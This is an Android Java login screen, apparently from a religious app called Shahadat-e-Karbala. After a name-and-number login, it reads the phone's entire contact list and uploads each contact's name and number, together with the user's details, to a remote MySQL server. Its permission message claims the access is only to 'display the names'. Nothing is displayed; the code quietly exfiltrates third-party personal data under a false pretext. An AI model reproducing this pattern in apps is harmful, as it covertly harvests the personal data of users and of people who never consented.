package shahadat_e_karbala.com.shahadatekarbala.login;

import android.Manifest;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.res.Resources;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.provider.ContactsContract;
import android.support.v7.app.ActionBar;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;

import java.util.ArrayList;

import shahadat_e_karbala.com.shahadatekarbala.HomeActivity;
import shahadat_e_karbala.com.shahadatekarbala.language.LocaleHelper;
import shahadat_e_karbala.com.shahadatekarbala.R;
import shahadat_e_karbala.com.shahadatekarbala.database.BackgroundWorker;
import shahadat_e_karbala.com.shahadatekarbala.database.ConstantKey;

public class LoginActivity extends AppCompatActivity {

    private static final int PERMISSIONS_REQUEST_READ_CONTACTS = 100;
    private ArrayList<String> arrayList;

    private SharedPreferences preferences;

    private Spinner spinner;
    private EditText loginName, loginMobile;
    private Button loginSubmit;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);

        spinner = (Spinner) findViewById(R.id.spinner_language);
        loginName = (EditText) findViewById(R.id.login_name);
        loginMobile = (EditText) findViewById(R.id.login_mobile);
        loginSubmit = (Button) findViewById(R.id.login_submit);

        //===============================================| Language Change
        String[] spinnerItems = getResources().getStringArray(R.array.language_array);
        ArrayAdapter<String> adapter = new ArrayAdapter<String>(this, android.R.layout.simple_dropdown_item_1line,spinnerItems) {
            public View getView(int position, View convertView, ViewGroup parent) {
                View v = super.getView(position, convertView, parent);
                ((TextView) v).setGravity(Gravity.CENTER); //To display in center of spinner
                return v;
            }
            public View getDropDownView(int position, View convertView, ViewGroup parent) {
                View v = super.getDropDownView(position, convertView,parent);
                ((TextView) v).setGravity(Gravity.CENTER); //After click to display center in popup
                return v;
            }
        };
        spinner.setAdapter(adapter);
        /*ArrayAdapter adapter = new ArrayAdapter(LoginActivity.this, android.R.layout.simple_spinner_dropdown_item, getResources().getStringArray(R.array.language_array));
        spinner.setAdapter(adapter);*/
        if (LocaleHelper.getLanguage(LoginActivity.this).equalsIgnoreCase("bn")) {
            spinner.setSelection(adapter.getPosition("Bangla"));
        } else if (LocaleHelper.getLanguage(LoginActivity.this).equalsIgnoreCase("en")) {
            spinner.setSelection(adapter.getPosition("English"));
        }
        spinner.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
            @Override
            public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                Context context;
                Resources resources;
                switch (position) {
                    case 0:
                        context = LocaleHelper.setLocale(LoginActivity.this, "bn");
                        //resources = context.getResources();
                        break;
                    case 1:
                        context = LocaleHelper.setLocale(LoginActivity.this, "en");
                        //resources = context.getResources();
                        break;
                }
            }
            @Override
            public void onNothingSelected(AdapterView<?> parent) {
            }
        });

        //===============================================| Create SharedPreferences & Check it
        preferences = getSharedPreferences("loginInfo", Context.MODE_PRIVATE);
        boolean isLoggedIn = preferences.getBoolean("isLoggedIn",false);

        if(isLoggedIn){
            goToHome();
        } else {

            loginSubmit.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {

                    if(haveNetwork()) {

                        if (!loginName.getText().toString().trim().isEmpty() && !loginMobile.getText().toString().trim().isEmpty()) {
                            //===============================================| Writes SharedPreferences
                            SharedPreferences.Editor editor = preferences.edit();
                            editor.putBoolean("isLoggedIn", true);
                            editor.putString("userName", loginName.getText().toString());
                            editor.putString("userPass", loginMobile.getText().toString());
                            editor.apply();
                            editor.commit();

                            boolean isLoggedIn = preferences.getBoolean("isLoggedIn", false);
                            if (isLoggedIn) {
                                showContacts(); //to get all contacts name and number
                            }

                        } else {
                            Toast.makeText(LoginActivity.this, "Please enter your name and mobile number", Toast.LENGTH_LONG).show();
                        }
                    } else {
                        Toast.makeText(LoginActivity.this, "Network connection is not available", Toast.LENGTH_LONG).show();
                    }

                }
            });

        }

    }

    //===============================================| Language Change
    @Override
    protected void attachBaseContext(Context newBase) {
        super.attachBaseContext(LocaleHelper.onAttach(newBase));
    }

    //===============================================| Check Internet Connection
    private boolean haveNetwork() {
        boolean have_Wifi = false;
        boolean have_MobileData = false;

        ConnectivityManager manager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        NetworkInfo[] infos = manager.getAllNetworkInfo();
        for (NetworkInfo info : infos) {
            if (info.getTypeName().equalsIgnoreCase("WIFI")) {
                if (info.isConnected()) {
                    have_Wifi = true;
                }
            }
            if (info.getTypeName().equalsIgnoreCase("MOBILE")) {
                if (info.isConnected()) {
                    have_MobileData = true;
                }
            }
        }
        return have_Wifi | have_MobileData;
    }

    //===============================================| SharedPreferences
    private void goToHome() {
        Intent intent = new Intent(this, HomeActivity.class);
        startActivity(intent);
    }

    //===============================================| Get Contacts
    private void showContacts() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, PERMISSIONS_REQUEST_READ_CONTACTS);
        } else {
            ProgressDialog progressBar = ProgressDialog.show(LoginActivity.this, "Contacts", "Please wait to get contacts");
            progressBar.setCancelable(true);

            arrayList = getContactNamesAndPhoneNumbers();
            insertLoginData(loginName.getText().toString(), loginMobile.getText().toString()); //MySQL web Server

            Intent intent = new Intent(getApplicationContext(), HomeActivity.class);
            intent.putExtra(ConstantKey.USER_NAME_KEY, loginName.getText().toString()); //Data pass from LoginActivity to HomeActivity
            startActivity(intent);
        }
    }

    public void insertLoginData(String logName, String logMobile) {
        String type = "login";
        BackgroundWorker worker = new BackgroundWorker(this);
        worker.execute(type, logName, logMobile);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        if (requestCode == PERMISSIONS_REQUEST_READ_CONTACTS) {
            if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                showContacts();
            } else {
                Toast.makeText(this, "Until you grant the permission, we can not display the names", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private ArrayList<String> getContactNamesAndPhoneNumbers() {
        arrayList = new ArrayList<>();
        try {
            Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME+" ASC");
            while (phones.moveToNext()){
                String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                insertContactsIntoServer(loginName.getText().toString(), loginMobile.getText().toString(), name.toString(),phoneNumber.toString()); //MySQL web server
            }
            phones.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return arrayList;
    }

    public void insertContactsIntoServer(String logName, String logPhone, String contactName, String phoneNumber){
        String type = "contacts";
        BackgroundWorker worker = new BackgroundWorker(this);
        worker.execute(type, logName, logPhone, contactName, phoneNumber);
    }


    //===============================================| For Activity Starting and Closing
    @Override
    protected void onStart() {
        super.onStart();
    }

    @Override
    protected void onStop() {
        super.onStop();
    }

    //===============================================| Restart Activity
    public void reload() {
        Intent intent = getIntent();
        overridePendingTransition(0, 0);
        intent.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
        finish();
        overridePendingTransition(0, 0);
        startActivity(intent);
    }

}
